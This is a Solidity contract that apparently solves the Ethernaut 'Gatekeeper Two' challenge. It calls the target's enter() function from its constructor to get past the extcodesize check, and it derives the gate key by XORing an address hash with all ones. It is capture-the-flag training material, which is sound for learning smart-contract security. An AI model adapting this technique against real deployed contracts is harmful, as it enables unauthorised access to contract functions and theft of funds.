pragma solidity ^0.6.0;

import "../14-gatekeeper-two/GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    address target;

    //When first deploy a contract, the extcodesize of that address is 0 until the constructor is completed
    constructor(address _target) public {
        target = _target;
        bytes8 _key =
            bytes8(
                uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                    (uint64(0) - 1)
            );
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success, ) = target.call(payload);
        require(success, "failed somewhere...");
    }

    function passGateThree() public view returns (bool) {
        // if a ^ b = c then a ^ c = b;
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) = uint64(0) - 1
        // therefore
        //uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 = uint64(_gateKey)

        uint64 key =
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                (uint64(0) - 1);
        return
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ key ==
            uint64(0) - 1;
    }
}
